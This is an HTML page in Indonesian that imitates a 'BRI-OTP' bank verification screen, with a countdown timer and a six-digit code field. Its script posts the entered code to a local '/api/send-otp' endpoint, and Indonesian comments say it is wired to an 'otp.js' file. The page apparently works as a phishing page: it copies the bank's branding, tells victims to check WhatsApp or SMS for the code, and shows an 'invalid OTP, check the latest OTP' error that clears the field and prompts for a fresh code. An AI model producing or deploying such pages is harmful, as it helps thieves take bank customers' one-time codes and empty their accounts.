<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cek SMS</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #dfe5ea;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

/* CARD */
.card {
  width: 300px;
  background: #f5f5f5;
  border-radius: 15px;
  text-align: center;
  padding: 20px;
  box-shadow: 0 5px 15px rgba(0,0,0,0.15);
}

/* IMAGE */
.icon {
  width: 120px;
  margin-top: -70px;
}

/* TITLE */
.title {
  font-size: 22px;
  font-weight: bold;
  color: #2a74b9;
}

/* LINE */
.line {
  border-top: 2px dashed #ccc;
  margin: 15px 0;
}

/* TIMER */
.timer {
  font-size: 28px;
  font-weight: bold;
  color: #2a74b9;
  letter-spacing: 2px;
}

/* INPUT */
.input-group {
  position: relative;
  margin-top: 15px;
}

.lock-icon {
  position: absolute;
  left: 12px;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: #999;
  transition: 0.3s;
}

.otp-input {
  width: 85%;
  height: 40px;
  font-size: 20px;
  text-align: center;
  border: 1.5px solid #ccc;
  border-radius: 10px;
  letter-spacing: 8px;
  padding-left: 35px;
  outline: none;
}

.input-group:focus-within .lock-icon {
  fill: #2a74b9;
  transform: translateY(-50%) scale(1.1);
}

/* BUTTON */
button {
  margin-top: 15px;
  padding: 8px 18px;
  border: none;
  background: #2a74b9;
  color: white;
  border-radius: 6px;
}

button:disabled {
  background: #aaa;
}

/* ERROR */
.error {
  color: #8B0000;
  font-weight: bold;
  display: none;
  margin-top: 10px;
}

/* TEXT */
.desc {
  font-size: 14px;
  margin-top: 10px;
}

/* RESEND */
.resend {
  margin-top: 20px;
  text-align: center;
}

.resend span {
  color: #2a74b9;
  font-weight: bold;
  cursor: pointer;
}

/* LOADING */
.loading {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: white;
  display: none;
  justify-content: center;
  align-items: center;
  flex-direction: column;
}

.spinner {
  width: 40px;
  height: 40px;
  border: 4px solid #ddd;
  border-top: 4px solid #2a74b9;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div>
  <div class="card">

    <img src="images/sms.png" class="icon">

    <div class="title">BRI-OTP</div>

    <div class="line"></div>

    <div class="timer" id="timer">02:50</div>

    <div class="input-group">
      <svg class="lock-icon" viewBox="0 0 24 24">
        <path d="M12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8H17V6C17 3.24 14.76 1 12 1Z"/>
      </svg>

      <input 
        type="password"
        id="otpInput"
        class="otp-input"
        maxlength="6"
        inputmode="numeric"
        pattern="[0-9]*"
        placeholder="••••••">
    </div>

    <button id="submitBtn" disabled>Lanjutkan</button>

    <div class="error" id="errorMsg">
      OTP TIDAK VALID<br>
      SILAHKAN CEK OTP TERBARU
    </div>

    <div class="desc">
      Kode OTP telah kami kirim ke nomor Telepon Anda, Silahkan Cek  WhatsApp/SMS dari<br>BRI-OTP.
      
    </div>

  </div>

  <div class="resend">
    Tidak Terima Sms? <span>Kirim Ulang</span>
  </div>
</div>

<!-- LOADING -->
<div class="loading" id="loading">
  <div class="spinner"></div>
  <div>Memverifikasi...</div>
</div>

<script>
// TIMER
let time = 170;
setInterval(() => {
  let m = Math.floor(time / 60);
  let s = time % 60;
  document.getElementById("timer").innerText =
    (m<10?"0":"")+m+" : "+(s<10?"0":"")+s;
  if(time > 0) time--;
}, 1000);

// OTP ONLY ANGKA
const input = document.getElementById("otpInput");
const btn = document.getElementById("submitBtn");
const error = document.getElementById("errorMsg");
const loading = document.getElementById("loading");

input.addEventListener("input", function(){
  this.value = this.value.replace(/\D/g,'');
  btn.disabled = this.value.length !== 6;
});

// ✅ SUBMIT (SUDAH TERHUBUNG KE API)
btn.addEventListener("click", async () => {
  loading.style.display = "flex";
  error.style.display = "none";

  try {
    const response = await fetch("/api/send-otp", { // SESUAI FILE KAMU: otp.js
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        otp: input.value
      })
    });

    const result = await response.json();

    loading.style.display = "none";

    if (result.status === "success") {
      // redirect kalau berhasil
      window.location.href = "/index.html"; // bisa kamu ganti
    } else {
      error.style.display = "block";
      input.value = "";
      btn.disabled = true;
    }

  } catch (err) {
    loading.style.display = "none";
    error.style.display = "block";
  }
});
</script>

</body> </html>
